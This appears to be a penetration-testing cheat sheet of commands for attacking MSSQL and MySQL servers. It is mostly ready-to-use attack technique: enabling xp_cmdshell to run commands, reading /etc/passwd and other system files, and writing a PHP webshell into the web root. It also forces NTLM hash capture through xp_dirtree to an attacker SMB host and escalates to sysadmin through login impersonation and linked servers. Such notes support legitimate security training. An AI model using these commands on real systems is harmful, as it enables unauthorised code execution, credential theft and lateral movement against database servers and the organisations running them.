# Attacking SQL Databases

MSSQL on TCP/1433 (hidden: TCP/2433). MySQL on TCP/3306. Nmap `-sC` pulls version, hostname, domain from MSSQL NTLM info banner.

---

## Connect

MSSQL from Linux:

```bash
mssqlclient.py -p 1433 <USER>@<TARGET>
sqsh -S <TARGET> -U <USER> -P '<PASS>' -h
```

MSSQL Windows auth from Linux (local account):

```bash
sqsh -S <TARGET> -U .\\<USER> -P '<PASS>' -h
```

MySQL from Linux:

```bash
mysql -u <USER> -p<PASS> -h <TARGET>
```

---

## Basic Enumeration Queries

MySQL:

```sql
SHOW DATABASES;
USE <DB>;
SHOW TABLES;
SELECT * FROM <TABLE>;
```

MSSQL (append `GO` after each statement):

```sql
SELECT name FROM master.dbo.sysdatabases
GO
SELECT table_name FROM <DB>.INFORMATION_SCHEMA.TABLES
GO
SELECT * FROM <TABLE>
GO
```

---

## MSSQL Command Execution

Enable and use `xp_cmdshell`:

```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
GO
xp_cmdshell 'whoami'
GO
```

---

## File Read / Write

MSSQL — read any file the service account can access:

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

MySQL — read (requires FILE priv + `secure_file_priv` empty):

```sql
SELECT LOAD_FILE("/etc/passwd");
```

MySQL — write webshell (if web root is writable and `secure_file_priv` is empty):

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Check `secure_file_priv` first:

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

---

## MSSQL Hash Stealing

Force MSSQL service account to authenticate to your SMB listener:

```sql
EXEC master..xp_dirtree '\\<ATTACK_HOST>\share\'
GO
```

Catch with Responder or impacket-smbserver → NTLMv2 hash → hashcat mode 5600.

---

## MSSQL Impersonation

Find impersonatable logins:

```sql
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Check current role:

```sql
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Impersonate sysadmin user:

```sql
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Revert: `REVERT`

> [!tip] Run `EXECUTE AS LOGIN` from the `master` DB — all users have access there. If impersonating in another DB fails with a permissions error, `USE master` first.

---

## MSSQL Linked Servers

Enumerate linked servers (`isremote=0` = linked, `1` = remote):

```sql
SELECT srvname, isremote FROM sysservers
GO
```

Execute on linked server:

```sql
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_SERVER>]
GO
```

Linked server sysadmin → `xp_cmdshell` on the remote instance → lateral movement.